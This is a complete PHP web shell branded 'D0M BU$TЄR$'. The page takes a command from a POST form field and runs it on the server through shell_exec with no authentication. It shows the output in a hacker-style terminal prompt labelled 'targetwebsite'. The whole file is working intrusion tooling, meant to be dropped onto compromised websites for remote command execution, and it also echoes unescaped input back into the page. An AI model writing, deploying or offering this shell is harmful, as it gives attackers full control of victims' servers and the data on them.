<?php
if (!empty($_POST["cmd"])) {
    $cmd = shell_exec($_POST["cmd"]);
} ?> <html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hack-font@3/build/web/hack.css">
    <title>D0M BU$TЄR$ - PHP Web Shell</title>
    <style>
      .line0>strong:nth-child(1),.line0>strong:nth-child(3),.line0>strong:nth-child(5),.line1>p:nth-child(1)   {
        color: #8ff0a4
      }
      .line0>strong:nth-child(2),.line1>p:nth-child(2) {
        color: #3584e4
      }
      form {
        margin: 0
      }
      .form-control:focus {
        box-shadow: none
      }
      .line0 {
        margin: 0;
        font-size: 18px
      }
      #cmd {
        font-family: Hack, monospace;
        width: calc(100% - 70px);
        display: inline-flex;
        padding: 0;
        font-size: 18px;
        line-height: 0;
        height: 18px;
        border: 0 gray solid;
        border-radius: 0
      }
      .line1 p {
        display: inline-grid;
        padding-right: 5px;
        line-height: 0;
        font-size: 18px;
        font-weight: 700
      }
      body {
        font-family: font-family: Hack, monospace;
        color: #d9d8bd;
        background-color: #000
      }
      #cmd {
        background: 0 0;
        color: #d9d8bd;
        height: 17px
      }
      h2 {
        color: rgba(0, 0, 0, .75)
      }
      pre {
        padding: 0 0 0 6px;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        border-radius: 5px;
        background-color: #ecf0f1;
        background: 0 0 !important;
        color: #d9d8bd;
        font-size: 17px;
        line-height: 1.6em;
        font-family: Hack, monospace
      }
      .container {
        width: 850px
      }
    </style>
  </head>
  <body>
    <main>
      <div class="container">
        <img style="border-radius:50%;margin:20px 0 10px -5px" src="https://cdn.discordapp.com/icons/1205617677410766909/cb814f90bfe9fe194b660cba0125fa73.webp?size=100">
        <p>
          <b>D0M BU$TЄR$</b>
        </p>
        <div class="pb-2 mt-4 mb-2"></div>
        <form method="POST">
          <div class="form-group">
            <label class="line0" for="cmd">
              <strong>┌──(</strong>
              <strong>D0M BU$TЄR$㉿targetwebsite</strong>
              <strong>)-[</strong>
              <strong>~</strong>
              <strong>]</strong>
            </label>
            <div class="line1"><p>└─</p><p>$</p><input name="cmd" id="cmd" type="text" class="form-control" value="<?php if(isset($_POST['cmd'])){ echo $_POST['cmd']; } ?>" required="">
            </div>
          </div>
        </form>
<?php if ($_SERVER["REQUEST_METHOD"] === "POST"): ?>
<?php if (isset($cmd)): ?>
<pre>
<?=htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") ?>
</pre>
<?php else: ?>
<pre>
<small>No result.</small>
</pre>
<?php endif; ?>
<?php endif; ?>
      </div>
    </main>
      <script>
    var cmdElement = document.getElementById('cmd');
    cmdElement.focus();
    cmdElement.setSelectionRange(cmdElement.value.length, cmdElement.value.length);
</script>

  </body>
</html>
